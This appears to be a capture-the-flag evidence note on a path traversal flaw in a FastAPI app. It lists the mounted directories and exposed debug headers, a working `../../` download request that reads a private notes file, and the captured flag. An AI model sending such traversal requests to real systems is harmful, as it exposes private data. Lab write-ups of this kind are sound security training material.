# Evidence — Path Traversal

- Stack: FastAPI + Uvicorn (ASGI).
- Two dirs mounted under `/static`: `/static/img`, `/static/uploads`.
- All debug headers exposed on `/backup`.
- First attempt returned `Forbidden`, then it worked:
  `GET /projects/download?file=../../data/private_notes.txt`
- Flag: `FLAG{d0t_d0t_sl4sh_4ll_th3_w4y_d0wn}`
